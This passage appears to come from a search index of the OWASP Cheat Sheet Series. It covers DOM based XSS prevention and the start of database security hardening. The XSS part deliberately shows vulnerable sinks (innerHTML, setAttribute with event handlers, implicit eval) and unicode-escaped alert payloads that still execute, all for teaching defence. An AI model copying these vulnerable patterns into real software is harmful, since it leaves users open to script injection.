ESAPI4JS . encodeForURL ( url ); //URL encoding using client-side scripts window . location = encodedURL ; } </ script > Inconsistencies of Encoding Libraries \u00b6 There are a number of open source encoding libraries out there: OWASP ESAPI OWASP Java Encoder Apache Commons Text StringEscapeUtils , replace one from Apache Commons Lang3 Jtidy Your company's custom implementation. Some work on a black list while others ignore important characters like \"<\" and \">\". Java Encoder is an active project providing supports for HTML, CSS and JavaScript encoding. ESAPI is one of the few which works on a whitelist and encodes all non-alphanumeric characters. It is important to use an encoding library that understands which characters can be used to exploit vulnerabilities in their respective contexts. Misconceptions abound related to the proper encoding that is required. Encoding Misconceptions \u00b6 Many security training curriculums and papers advocate the blind usage of HTML encoding to resolve XSS. This logically seems to be prudent advice as the JavaScript parser does not understand HTML encoding. However, if the pages returned from your web application utilize a content type of text/xhtml or the file type extension of *.xhtml then HTML encoding may not work to mitigate against XSS. For example: < script > & # x61 ; lert ( 1 ); </ script > The HTML encoded value above is still executable. If that isn't enough to keep in mind, you have to remember that encodings are lost when you retrieve them using the value attribute of a DOM element. Let's look at the sample page and script: < form name = \"myForm\" ... > < input type = \"text\" name = \"lName\" value = \"<%=Encoder.encodeForHTML(last_name)%>\" > ... </ form > < script > var x = document . myForm . lName . value ; //when the value is retrieved the encoding is reversed document . writeln ( x ); //any code passed into lName is now executable. </ script > Finally there is the problem that certain methods in JavaScript which are usually safe can be unsafe in certain contexts. Usually Safe Methods \u00b6 One example of an attribute which is thought to be safe is innerText . Some papers or guides advocate its use as an alternative to innerHTML to mitigate against XSS in innerHTML . However, depending on the tag which innerText is applied, code can be executed. < script > var tag = document . createElement ( \"script\" ); tag . innerText = \"<%=untrustedData%>\" ; //executes code </ script > The innerText feature was originally introduced by Internet Explorer, and was formally specified in the HTML standard in 2016 after being adopted by all major browser vendors.","title":"DOM based XSS Prevention"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#dom-based-xss-prevention-cheat-sheet","text":"","title":"DOM based XSS Prevention Cheat Sheet"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#introduction","text":"When looking at XSS (Cross-Site Scripting), there are three generally recognized forms of XSS : Reflected or Stored DOM Based XSS . The XSS Prevention Cheatsheet does an excellent job of addressing Reflected and Stored XSS. This cheatsheet addresses DOM (Document Object Model) based XSS and is an extension (and assumes comprehension of) the XSS Prevention Cheatsheet . In order to understand DOM based XSS, one needs to see the fundamental difference between Reflected and Stored XSS when compared to DOM based XSS. The primary difference is where the attack is injected into the application. Reflected and Stored XSS are server side injection issues while DOM based XSS is a client (browser) side injection issue. All of this code originates on the server, which means it is the application owner's responsibility to make it safe from XSS, regardless of the type of XSS flaw it is. Also, XSS attacks always execute in the browser. The difference between Reflected/Stored XSS is where the attack is added or injected into the application. With Reflected/Stored the attack is injected into the application during server-side processing of requests where untrusted input is dynamically added to HTML. For DOM XSS, the attack is injected into the application during runtime in the client directly. When a browser is rendering HTML and any other associated content like CSS, JavaScript, etc. it identifies various rendering contexts for the different kinds of input and follows different rules for each context. A rendering context is associated with the parsing of HTML tags and their attributes. The HTML parser of the rendering context dictates how data is presented and laid out on the page and can be further broken down into the standard contexts of HTML, HTML attribute, URL, and CSS. The JavaScript or VBScript parser of an execution context is associated with the parsing and execution of script code. Each parser has distinct and separate semantics in the way they can possibly execute script code which make creating consistent rules for mitigating vulnerabilities in various contexts difficult. The complication is compounded by the differing meanings and treatment of encoded values within each subcontext (HTML, HTML attribute, URL, and CSS) within the execution context. For the purposes of this article, we refer to the HTML, HTML attribute, URL, and CSS contexts as subcontexts because each of these contexts can be reached and set within a JavaScript execution context. In JavaScript code, the main context is JavaScript but with the right tags and context closing characters, an attacker can try to attack the other 4 contexts using equivalent JavaScript DOM methods. The following is an example vulnerability which occurs in the JavaScript context and HTML subcontext: < script > var x = '<%= taintedVar %>' ; var d = document . createElement ( 'div' ); d . innerHTML = x ; document . body . appendChild ( d ); </ script > Let's look at the individual subcontexts of the execution context in turn.","title":"Introduction"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-1-html-escape-then-javascript-escape-before-inserting-untrusted-data-into-html-subcontext-within-the-execution-context","text":"There are several methods and attributes which can be used to directly render HTML content within JavaScript. These methods constitute the HTML Subcontext within the Execution Context. If these methods are provided with untrusted input, then an XSS vulnerability could result. For example:","title":"RULE #1 - HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#example-dangerous-html-methods","text":"","title":"Example Dangerous HTML Methods"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#attributes","text":"element . innerHTML = \"<HTML> Tags and markup\" ; element . outerHTML = \"<HTML> Tags and markup\" ;","title":"Attributes"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#methods","text":"document . write ( \"<HTML> Tags and markup\" ); document . writeln ( \"<HTML> Tags and markup\" );","title":"Methods"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline","text":"To make dynamic updates to HTML in the DOM safe, we recommend: HTML encoding, and then JavaScript encoding all untrusted input, as shown in these examples: element . innerHTML = \"<%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%>\" ; element . outerHTML = \"<%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%>\" ; document . write ( \"<%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%>\" ); document . writeln ( \"<%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%>\" ); Note: The Encoder.encodeForHTML() and Encoder.encodeForJS() are just notional encoders. Various options for actual encoders are listed later in this document.","title":"Guideline"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-2-javascript-escape-before-inserting-untrusted-data-into-html-attribute-subcontext-within-the-execution-context","text":"The HTML attribute subcontext within the execution context is divergent from the standard encoding rules. This is because the rule to HTML attribute encode in an HTML attribute rendering context is necessary in order to mitigate attacks which try to exit out of an HTML attributes or try to add additional attributes which could lead to XSS. When you are in a DOM execution context you only need to JavaScript encode HTML attributes which do not execute code (attributes other than event handler, CSS, and URL attributes). For example, the general rule is to HTML Attribute encode untrusted data (data from the database, HTTP request, user, back-end system, etc.) placed in an HTML Attribute. This is the appropriate step to take when outputting data in a rendering context, however using HTML Attribute encoding in an execution context will break the application display of data.","title":"RULE #2 - JavaScript Escape Before Inserting Untrusted Data into HTML Attribute Subcontext within the Execution Context"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#safe-but-broken-example","text":"var x = document . createElement ( \"input\" ); x . setAttribute ( \"name\" , \"company_name\" ); // In the following line of code, companyName represents untrusted user input // The Encoder.encodeForHTMLAttr() is unnecessary and causes double-encoding x . setAttribute ( \"value\" , '<%=Encoder.encodeForJS(Encoder.encodeForHTMLAttr(companyName))%>' ); var form1 = document . forms [ 0 ]; form1 . appendChild ( x ); The problem is that if companyName had the value \"Johnson & Johnson\". What would be displayed in the input text field would be \"Johnson & Johnson\". The appropriate encoding to use in the above case would be only JavaScript encoding to disallow an attacker from closing out the single quotes and in-lining code, or escaping to HTML and opening a new script tag.","title":"SAFE but BROKEN example"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#safe-and-functionally-correct-example","text":"var x = document . createElement ( \"input\" ); x . setAttribute ( \"name\" , \"company_name\" ); x . setAttribute ( \"value\" , '<%=Encoder.encodeForJS(companyName)%>' ); var form1 = document . forms [ 0 ]; form1 . appendChild ( x ); It is important to note that when setting an HTML attribute which does not execute code, the value is set directly within the object attribute of the HTML element so there is no concerns with injecting up.","title":"SAFE and FUNCTIONALLY CORRECT example"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-3-be-careful-when-inserting-untrusted-data-into-the-event-handler-and-javascript-code-subcontexts-within-an-execution-context","text":"Putting dynamic data within JavaScript code is especially dangerous because JavaScript encoding has different semantics for JavaScript encoded data when compared to other encodings. In many cases, JavaScript encoding does not stop attacks within an execution context. For example, a JavaScript encoded string will execute even though it is JavaScript encoded. Therefore, the primary recommendation is to avoid including untrusted data in this context . If you must, the following examples describe some approaches that do and do not work. var x = document . createElement ( \"a\" ); x . href = \"#\" ; // In the line of code below, the encoded data on the right (the second argument to setAttribute) // is an example of untrusted data that was properly JavaScript encoded but still executes. x . setAttribute ( \"onclick\" , \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0032\\u0032\\u0029\" ); var y = document . createTextNode ( \"Click To Test\" ); x . appendChild ( y ); document . body . appendChild ( x ); The setAttribute(name_string,value_string) method is dangerous because it implicitly coerces the value_string into the DOM attribute datatype of name_string . In the case above, the attribute name is an JavaScript event handler, so the attribute value is implicitly converted to JavaScript code and evaluated. In the case above, JavaScript encoding does not mitigate against DOM based XSS. Other JavaScript methods which take code as a string types will have a similar problem as outline above ( setTimeout , setInterval , new Function, etc.). This is in stark contrast to JavaScript encoding in the event handler attribute of a HTML tag (HTML parser) where JavaScript encoding mitigates against XSS. <!-- Does NOT work --> < a id = \"bb\" href = \"#\" onclick = \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\" > Test Me </ a > An alternative to using Element.setAttribute(...) to set DOM attributes is to set the attribute directly. Directly setting event handler attributes will allow JavaScript encoding to mitigate against DOM based XSS. Please note, it is always dangerous design to put untrusted data directly into a command execution context. < a id = \"bb\" href = \"#\" > Test Me </ a > //The following does NOT work because the event handler is being set to a string. //\"alert(7)\" is JavaScript encoded. document . getElementById ( \"bb\" ). onclick = \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0037\\u0029\" ; //The following does NOT work because the event handler is being set to a string. document . getElementById ( \"bb\" ). onmouseover = \"testIt\" ; //The following does NOT work because of the encoded \"(\" and \")\". //\"alert(77)\" is JavaScript encoded. document . getElementById ( \"bb\" ). onmouseover = \\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0037\\u0037\\u0029 ; //The following does NOT work because of the encoded \";\". //\"testIt;testIt\" is JavaScript encoded. document . getElementById ( \"bb\" ). onmouseover = \\u0074\\u0065\\u0073\\u0074\\u0049\\u0074\\u003b\\u0074\\u0065\\u0073 \\u0074\\u0049\\u0074 ; //The following DOES WORK because the encoded value is a valid variable name or function reference. //\"testIt\" is JavaScript encoded document . getElementById ( \"bb\" ). onmouseover = \\u0074\\u0065\\u0073\\u0074\\u0049\\u0074 ; function testIt () { alert ( \"I was called.\" ); } There are other places in JavaScript where JavaScript encoding is accepted as valid executable code. for ( var \\u0062 = 0 ; \\u0062 < 10 ; \\u0062 ++ ){ \\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074 . \\u0077\\u0072\\u0069\\u0074\\u0065\\u006c\\u006e ( \"\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0057\\u006f\\u0072\\u006c\\u0064\" ); } \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077 . \\u0065\\u0076\\u0061\\u006c \\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074 . \\u0077\\u0072\\u0069\\u0074\\u0065 ( 111111111 ); or var s = \"\\u0065\\u0076\\u0061\\u006c\" ; var t = \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\" ; window [ s ]( t ); Because JavaScript is based on an international standard (ECMAScript), JavaScript encoding enables the support of international characters in programming constructs and variables in addition to alternate string representations (string escapes). However the opposite is the case with HTML encoding. HTML tag elements are well defined and do not support alternate representations of the same tag. So HTML encoding cannot be used to allow the developer to have alternate representations of the <a> tag for example.","title":"RULE #3 - Be Careful when Inserting Untrusted Data into the Event Handler and JavaScript code Subcontexts within an Execution Context"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#html-encodings-disarming-nature","text":"In general, HTML encoding serves to castrate HTML tags which are placed in HTML and HTML attribute contexts. Working example (no HTML encoding): < a href = \"...\" > Normally encoded example (Does Not Work \u2013 DNW): &#x3c; a href=... &#x3e; HTML encoded example to highlight a fundamental difference with JavaScript encoded values (DNW): < &#x61; href=...> If HTML encoding followed the same semantics as JavaScript encoding. The line above could have possibly worked to render a link. This difference makes JavaScript encoding a less viable weapon in our fight against XSS.","title":"HTML Encoding's Disarming Nature"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-4-javascript-escape-before-inserting-untrusted-data-into-the-css-attribute-subcontext-within-the-execution-context","text":"Normally executing JavaScript from a CSS context required either passing javascript:attackCode() to the CSS url() method or invoking the CSS expression() method passing JavaScript code to be directly executed. From my experience, calling the expression() function from an execution context (JavaScript) has been disabled. In order to mitigate against the CSS url() method, ensure that you are URL encoding the data passed to the CSS url() method. document . body . style . backgroundImage = \"url(<%=Encoder.encodeForJS(Encoder.encodeForURL(companyName))%>)\" ;","title":"RULE #4 - JavaScript Escape Before Inserting Untrusted Data into the CSS Attribute Subcontext within the Execution Context"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-5-url-escape-then-javascript-escape-before-inserting-untrusted-data-into-url-attribute-subcontext-within-the-execution-context","text":"The logic which parses URLs in both execution and rendering contexts looks to be the same. Therefore there is little change in the encoding rules for URL attributes in an execution (DOM) context. var x = document . createElement ( \"a\" ); x . setAttribute ( \"href\" , '<%=Encoder.encodeForJS(Encoder.encodeForURL(userRelativePath))%>' ); var y = document . createTextElement ( \"Click Me To Test\" ); x . appendChild ( y ); document . body . appendChild ( x ); If you utilize fully qualified URLs then this will break the links as the colon in the protocol identifier ( http: or javascript: ) will be URL encoded preventing the http and javascript protocols from being invoked.","title":"RULE #5 - URL Escape then JavaScript Escape Before Inserting Untrusted Data into URL Attribute Subcontext within the Execution Context"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-6-populate-the-dom-using-safe-javascript-functions-or-properties","text":"The most fundamental safe way to populate the DOM with untrusted data is to use the safe assignment property textContent . Here is an example of safe usage. < script > element . textContent = untrustedData ; //does not execute code </ script >","title":"RULE #6 - Populate the DOM using safe JavaScript functions or properties"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-7-fixing-dom-cross-site-scripting-vulnerabilities","text":"The best way to fix DOM based cross-site scripting is to use the right output method (sink). For example if you want to use user input to write in a div tag element don't use innerHtml , instead use innerText or textContent . This will solve the problem, and it is the right way to re-mediate DOM based XSS vulnerabilities. It is always a bad idea to use a user-controlled input in dangerous sources such as eval. 99% of the time it is an indication of bad or lazy programming practice, so simply don't do it instead of trying to sanitize the input. Finally, to fix the problem in our initial code, instead of trying to encode the output correctly which is a hassle and can easily go wrong we would simply use element.textContent to write it in a content like this: < b > Current URL: </ b > < span id = \"contentholder\" ></ span > ... < script > document . getElementById ( \"contentholder\" ). textContent = document . baseURI ; </ script > It does the same thing but this time it is not vulnerable to DOM based cross-site scripting vulnerabilities.","title":"RULE #7 - Fixing DOM Cross-site Scripting Vulnerabilities"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guidelines-for-developing-secure-applications-utilizing-javascript","text":"DOM based XSS is extremely difficult to mitigate against because of its large attack surface and lack of standardization across browsers. The guidelines below are an attempt to provide guidelines for developers when developing Web based JavaScript applications (Web 2.0) such that they can avoid XSS.","title":"Guidelines for Developing Secure Applications Utilizing JavaScript"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-1-untrusted-data-should-only-be-treated-as-displayable-text","text":"Avoid treating untrusted data as code or markup within JavaScript code.","title":"GUIDELINE #1 - Untrusted data should only be treated as displayable text"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-2-always-javascript-encode-and-delimit-untrusted-data-as-quoted-strings-when-entering-the-application-when-building-templated-javascript","text":"Always JavaScript encode and delimit untrusted data as quoted strings when entering the application as illustrated in the following example. var x = \"<%= Encode.forJavaScript(untrustedData) %>\" ;","title":"GUIDELINE #2 - Always JavaScript encode and delimit untrusted data as quoted strings when entering the application when building templated JavaScript"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-3-use-documentcreateelement-elementsetattributevalue-elementappendchild-and-similar-to-build-dynamic-interfaces","text":"document.createElement(\"...\") , element.setAttribute(\"...\",\"value\") , element.appendChild(...) and similar are save ways to build dynamic interfaces. Please note, element.setAttribute is only safe for a limited number of attributes. Dangerous attributes include any attribute that is a command execution context, such as onclick or onblur . Examples of safe attributes includes: align , alink , alt , bgcolor , border , cellpadding , cellspacing , class , color , cols , colspan , coords , dir , face , height , hspace , ismap , lang , marginheight , marginwidth , multiple , nohref , noresize , noshade , nowrap , ref , rel , rev , rows , rowspan , scrolling , shape , span , summary , tabindex , title , usemap , valign , value , vlink , vspace , width .","title":"GUIDELINE #3 - Use document.createElement(\"...\"), element.setAttribute(\"...\",\"value\"), element.appendChild(...) and similar to build dynamic interfaces"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-4-avoid-sending-untrusted-data-into-html-rendering-methods","text":"Avoid populating the following methods with untrusted data. element.innerHTML = \"...\"; element.outerHTML = \"...\"; document.write(...); document.writeln(...);","title":"GUIDELINE #4 - Avoid sending untrusted data into HTML rendering methods"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-5-avoid-the-numerous-methods-which-implicitly-eval-data-passed-to-it","text":"There are numerous methods which implicitly eval() data passed to it that must be avoided. Make sure that any untrusted data passed to these methods is: Delimited with string delimiters Enclosed within a closure or JavaScript encoded to N-levels based on usage Wrapped in a custom function. Ensure to follow step 3 above to make sure that the untrusted data is not sent to dangerous methods within the custom function or handle it by adding an extra layer of encoding.","title":"GUIDELINE #5 - Avoid the numerous methods which implicitly eval() data passed to it"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#utilizing-an-enclosure-as-suggested-by-gaz","text":"The example that follows illustrates using closures to avoid double JavaScript encoding. setTimeout (( function ( param ) { return function () { customFunction ( param ); } })( \"<%=Encoder.encodeForJS(untrustedData)%>\" ), y ); The other alternative is using N-levels of encoding.","title":"Utilizing an Enclosure (as suggested by Gaz)"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#n-levels-of-encoding","text":"If your code looked like the following, you would need to only double JavaScript encode input data. setTimeout ( \"customFunction('<%=doubleJavaScriptEncodedData%>', y)\" ); function customFunction ( firstName , lastName ) alert ( \"Hello\" + firstName + \" \" + lastNam ); } The doubleJavaScriptEncodedData has its first layer of JavaScript encoding reversed (upon execution) in the single quotes. Then the implicit eval of setTimeout reverses another layer of JavaScript encoding to pass the correct value to customFunction The reason why you only need to double JavaScript encode is that the customFunction function did not itself pass the input to another method which implicitly or explicitly called eval If firstName was passed to another JavaScript method which implicitly or explicitly called eval() then <%=doubleJavaScriptEncodedData%> above would need to be changed to <%=tripleJavaScriptEncodedData%> . An important implementation note is that if the JavaScript code tries to utilize the double or triple encoded data in string comparisons, the value may be interpreted as different values based on the number of evals() the data has passed through before being passed to the if comparison and the number of times the value was JavaScript encoded. If A is double JavaScript encoded then the following if check will return false. var x = \"doubleJavaScriptEncodedA\" ; //\\u005c\\u0075\\u0030\\u0030\\u0034\\u0031 if ( x == \"A\" ) { alert ( \"x is A\" ); } else if ( x == \"\\u0041\" ) { alert ( \"This is what pops\" ); } This brings up an interesting design point. Ideally, the correct way to apply encoding and avoid the problem stated above is to server-side encode for the output context where data is introduced into the application. Then client-side encode (using a JavaScript encoding library such as ESAPI4JS ) for the individual subcontext (DOM methods) which untrusted data is passed to. ESAPI4JS and jQuery Encoder are two client side encoding libraries developed by Chris Schmidt. Here are some examples of how they are used: //server-side encoding var input = \"<%=Encoder.encodeForJS(untrustedData)%>\" ; //HTML encoding is happening in JavaScript document . writeln ( ESAPI4JS . encodeForHTML ( input )); One option is utilize ECMAScript 5 immutable properties in the JavaScript library. Another option provided by Gaz (Gareth) was to use a specific code construct to limit mutability with anonymous closures. An example follows: function escapeHTML ( str ) { str = str + \"''\" ; var out = \"''\" ; for ( var i = 0 ; i < str . length ; i ++ ) { if ( str [ i ] === '<' ) { out += '&lt;' ; } else if ( str [ i ] === '>' ) { out += '&gt;' ; } else if ( str [ i ] === \"'\" ) { out += '&#39;' ; } else if ( str [ i ] === '\"' ) { out += '&quot;' ; } else { out += str [ i ]; } } return out ; } Chris Schmidt has put together another implementation of a JavaScript encoder here .","title":"N-Levels of Encoding"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-6-limit-the-usage-of-untrusted-data-to-only-right-side-operations","text":"Not only is it good design to limit the usage of untrusted data to right side operations, but also be aware of data which may be passed to the application which look like code (eg. location , eval() ). If you want to change different object attributes based on user input then use a level of indirection. Instead of: window [ userData ] = \"moreUserData\" ; Do the following instead: if ( userData === \"location\" ) { window . location = \"static/path/or/properly/url/encoded/value\" ; }","title":"GUIDELINE #6 - Limit the usage of untrusted data to only right side operations"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-7-when-url-encoding-in-dom-be-aware-of-character-set-issues","text":"When URL encoding in DOM be aware of character set issues as the character set in JavaScript DOM is not clearly defined (Mike Samuel).","title":"GUIDELINE #7 - When URL encoding in DOM be aware of character set issues"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-8-limit-access-to-properties-objects-when-using-objectx-accessors","text":"Limit access to properties objects when using object[x] accessors (Mike Samuel). In other words use a level of indirection between untrusted input and specified object properties. Here is an example of the problem when using map types: var myMapType = {}; myMapType [ <%= untrustedData %> ] = \"moreUntrustedData\" ; Although the developer writing the code above was trying to add additional keyed elements to the myMapType object. This could be used by an attacker to subvert internal and external attributes of the myMapType object.","title":"GUIDELINE #8 - Limit access to properties objects when using object[x] accessors"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-9-run-your-javascript-in-a-ecmascript-5-canopy-or-sandbox","text":"Run your JavaScript in a ECMAScript 5 canopy or sandbox to make it harder for your JavaScript API to be compromised (Gareth Heyes and John Stevens).","title":"GUIDELINE #9 - Run your JavaScript in a ECMAScript 5 canopy or sandbox"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#guideline-10-dont-eval-json-to-convert-it-to-native-javascript-objects","text":"Don't eval() JSON to convert it to native JavaScript objects. Instead use JSON.toJSON() and JSON.parse() (Chris Schmidt).","title":"GUIDELINE #10 - Don't eval() JSON to convert it to native JavaScript objects"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#common-problems-associated-with-mitigating-dom-based-xss","text":"","title":"Common Problems Associated with Mitigating DOM Based XSS"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#complex-contexts","text":"In many cases the context isn't always straightforward to discern. < a href = \"javascript:myFunction('<%=untrustedData%>', 'test');\" > Click Me </ a > ... < script > Function myFunction ( url , name ) { window . location = url ; } </ script > In the above example, untrusted data started in the rendering URL context ( href attribute of an a tag) then changed to a JavaScript execution context ( javascript: protocol handler) which passed the untrusted data to an execution URL subcontext ( window.location of myFunction ). Because the data was introduced in JavaScript code and passed to a URL subcontext the appropriate server-side encoding would be the following: < a href = \"javascript:myFunction('<%=Encoder.encodeForJS(Encoder.encodeForURL(untrustedData)) %>', 'test');\" > Click Me </ a > ... Or if you were using ECMAScript 5 with an immutable JavaScript client-side encoding libraries you could do the following: <!-- server side URL encoding has been removed. Now only JavaScript encoding on server side. --> < a href = \"javascript:myFunction('<%=Encoder.encodeForJS(untrustedData)%>', 'test');\" > Click Me </ a > ... < script > Function myFunction ( url , name ) { var encodedURL = ESAPI4JS . encodeForURL ( url ); //URL encoding using client-side scripts window . location = encodedURL ; } </ script >","title":"Complex Contexts"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#inconsistencies-of-encoding-libraries","text":"There are a number of open source encoding libraries out there: OWASP ESAPI OWASP Java Encoder Apache Commons Text StringEscapeUtils , replace one from Apache Commons Lang3 Jtidy Your company's custom implementation. Some work on a black list while others ignore important characters like \"<\" and \">\". Java Encoder is an active project providing supports for HTML, CSS and JavaScript encoding. ESAPI is one of the few which works on a whitelist and encodes all non-alphanumeric characters. It is important to use an encoding library that understands which characters can be used to exploit vulnerabilities in their respective contexts. Misconceptions abound related to the proper encoding that is required.","title":"Inconsistencies of Encoding Libraries"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#encoding-misconceptions","text":"Many security training curriculums and papers advocate the blind usage of HTML encoding to resolve XSS. This logically seems to be prudent advice as the JavaScript parser does not understand HTML encoding. However, if the pages returned from your web application utilize a content type of text/xhtml or the file type extension of *.xhtml then HTML encoding may not work to mitigate against XSS. For example: < script > & # x61 ; lert ( 1 ); </ script > The HTML encoded value above is still executable. If that isn't enough to keep in mind, you have to remember that encodings are lost when you retrieve them using the value attribute of a DOM element. Let's look at the sample page and script: < form name = \"myForm\" ... > < input type = \"text\" name = \"lName\" value = \"<%=Encoder.encodeForHTML(last_name)%>\" > ... </ form > < script > var x = document . myForm . lName . value ; //when the value is retrieved the encoding is reversed document . writeln ( x ); //any code passed into lName is now executable. </ script > Finally there is the problem that certain methods in JavaScript which are usually safe can be unsafe in certain contexts.","title":"Encoding Misconceptions"},{"location":"cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#usually-safe-methods","text":"One example of an attribute which is thought to be safe is innerText . Some papers or guides advocate its use as an alternative to innerHTML to mitigate against XSS in innerHTML . However, depending on the tag which innerText is applied, code can be executed. < script > var tag = document . createElement ( \"script\" ); tag . innerText = \"<%=untrustedData%>\" ; //executes code </ script > The innerText feature was originally introduced by Internet Explorer, and was formally specified in the HTML standard in 2016 after being adopted by all major browser vendors.","title":"Usually Safe Methods"},{"location":"cheatsheets/Database_Security_Cheat_Sheet.html","text":"Database Security Cheat Sheet \u00b6 Introduction \u00b6 This cheat sheet provides guidance on securely configuring and using the SQL and NoSQL databases. It is intended to be used by application developers when they are responsible for managing the databases, in the absence of a dedicated database administrator (DBA). For details about protecting against SQL Injection attacks, see the SQL Injection Prevention Cheat Sheet . Connecting to the Database \u00b6 The backend database used by the application should be isolated as much as possible, in order to prevent malicious or undesirable users from being able to connect to it. Exactly how this is achieved will depend on the system and network architecture. The following options could be used to protect it: Disabling network (TCP) access and requiring all access is over a local socket file or named pipe. Configuring the database to only bind on localhost. Restricting access to the network port to specific hosts with firewall rules. Placing the database server in a separate DMZ isolated from the application server. Similar protection should be implemented to protect any web-based management tools used with the database, such as phpMyAdmin. When an application is running on an untrusted system (such as a thick-client), it should always connect to the backend through an API that can enforce appropriate access control and restrictions. Direct connections should never be made from a thick client to the backend database. Transport Layer Protection \u00b6 Most databases will allow unencrypted network connections in their default configurations. Although some will encrypt the initial authentication (such as Microsoft SQL Server), the rest of the traffic will be unencrypted, meaning that all kinds of sensitive information will be sent across the network in clear text. The following steps should be taken to prevent unencrypted traffic: Configure the database to only allow encrypted connections. Install a trusted digital certificate on the server. Configure the client application to connect using TLSv1.2+ with modern ciphers (e.g, AES-GCM or ChaCha20). Configure the client application to verify that the digital certificate is correct. The Transport Layer Protection and TLS Cipher String Cheat Sheets contain further guidance on securely configuring TLS. Authentication \u00b6 The database should be configured to always require authentication, including connections from the local server. Database accounts should be: Protected with strong and unique passwords. Used by a single application or service. Configured with the minimum permissions required as discussed in the permissions section below . As with any system that has its own user accounts, the usual account management processes should be followed, including: Regular reviews of the accounts to ensure that they are still required. Regular reviews of permissions. Removing user accounts when an application is decommissioned. Changing the passwords when staff leave, or there is reason to believe that they may have been compromised. For Microsoft SQL Server, consider the use of Windows or Integrated-Authentication , which uses existing Windows accounts rather than SQL Server accounts. This also removes the requirement to store credentials in the application, as it will connect using the credentials of the Windows user it is running under. The Windows Native Authentication Plugins provides similar functionality for MySQL. Storing Database Credentials \u00b6 Database credentials should never be stored in the application source code, especially if they are unencrypted. Instead, they should be stored in a configuration file that: Is outside of the webroot. Has appropriate permissions so that it can only be read by the required user(s). Is not checked into source code repositories. Where possible, these credentials should also be encrypted or otherwise protected using built-in functionality, such as the web.config encryption available in ASP.NET . Permissions \u00b6 The permissions assigned to database user accounts should be based on the principle of least privilege (i.e, the accounts should only have the minimal permissions required for the application to function). This can be applied at a number of increasingly granular levels levels depending on the functionality available in the database. The following steps should be applicable to all environments: Do not use the built-in root , sa or SYS accounts. Do not grant the account administrative rights over the database instance. Only allow the account to connect from whitelisted hosts. This would often be localhost or the address of the application server. Only grant the account access to the specific databases it needs. Development, UAT and Production environments should all use separate databases and accounts. Only grant the required permissions on the databases. Most applications would only need SELECT , UPDATE and DELETE permissions. The account should not be the owner of the database as this can lead to privilege escalation vulnerabilities. Avoid using database links or linked servers. Where they are required, use an account that has been granted access to only the minimum databases, tables, and system privileges required. For more security-critical applications, it is possible to apply permissions at more granular levels, including: Table-level permissions. Column-level permissions. Row-level permissions Blocking access to the underlying tables, and requiring all access through restricted views . Database Configuration and Hardening \u00b6 The underlying operating system for the database server should be hardened in the same way as any other server, based on a secure baseline such as the CIS Benchmarks or the Microsoft Security Baselines . The database application should also be properly configured and hardened. The following principles should apply to any database application and platform: Install any required security updates and patches. Configure the database services to run under a low privileged user account. Remove any default accounts and databases. Store transaction logs on a separate disk to the main database files. Configure a regular backup of the database. Ensure that the backups are protected with appropriate permissions, and ideally encrypted. The following sections gives some further recommendations for specific database software, in addition to the more general recommendations given above. Microsoft SQL Server \u00b6 Disable xp_cmdshell , xp_dirtree and other stored procedures that are not required. Disable Common Language Runtime (CLR) execution. 